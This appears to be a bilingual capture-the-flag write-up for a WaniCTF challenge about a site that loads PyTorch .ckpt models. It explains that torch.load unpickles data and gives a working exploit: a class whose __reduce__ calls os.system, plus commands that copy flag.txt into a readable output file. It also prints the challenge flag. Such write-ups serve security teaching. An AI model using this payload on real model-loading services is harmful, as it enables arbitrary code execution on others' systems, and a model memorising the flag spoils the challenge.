---
title: "machine_loading"
level: 4
flag: "FLAG{Use_0ther_extens10n_such_as_safetensors}"
writer: "Mikka"
badge: true
---

## 問題文

機械学習モデルを試すことができるサイトを作っています。

まだ未完成ですが、モデルをロードする部分は先に作成しました。

モデルの形式は、みんなよく使っている.ckptにします！

I'm creating a website where users can test machine learning models.

It's not completed yet, but I've already created the part that loads a model.

The format of the model will be .ckpt, which we all use a lot!

<https://machine-mis.wanictf.org>

## 解法

ググって、torch.load()には脆弱性があり、脆弱性の原因がpickleにあることに辿りつく。

これはtorch.load (torch.save)の内部処理がpickleであるため (大雑把な表現)。

torch.loadではtorch.saveにより生成されたファイルを読み込むが、これはPythonのclassをそのままオブジェクトとして保存するため、任意コード実行ができる。

exploitの実装としてはtorch.loadの脆弱性としては文献が少ないため、pickleのdump, loadの脆弱性の文献を探すとヒットする。

任意コード実行の用意ができたら、output.txtの内容を表示させる機能が既にあることが配布ファイルから分かるため、
```
ls > ./output_dir/output.txt
cat ./flag.txt > ./output_dir/output.txt
```
とすることでFLAGを表示できる。


Search and find that there is a vulnerability in torch.load() due to the use of pickle in its internal processing.

torch.load() reads files generated by torch.save(). Since it saves Python class objects as they are, it can be used to execute arbitrary code.

Note that it's torch.save, not pickle.dump. However, you'll find it easier to find references for pickle.

When you're ready to execute arbitrary code, execute the following code.
```
ls > output.txt
cat ./flag.txt > ./output.txt
```
Since there is already a function to display the contents of output.txt, FLAG will be displayed.


exploitは以下の通りである。
exploit is like this:
```python
import os
import torch

class Exploit(object):
    def __reduce__(self):
        cmd = ('cat ./flag.txt > ./output_dir/output.txt')
        # cmd = ('ls > ./output_dir/output.txt')
        return os.system, (cmd,)

# torch.save(Exploit(), 'solver_ls.ckpt')
torch.save(Exploit(), 'solver_cat.ckpt')
```
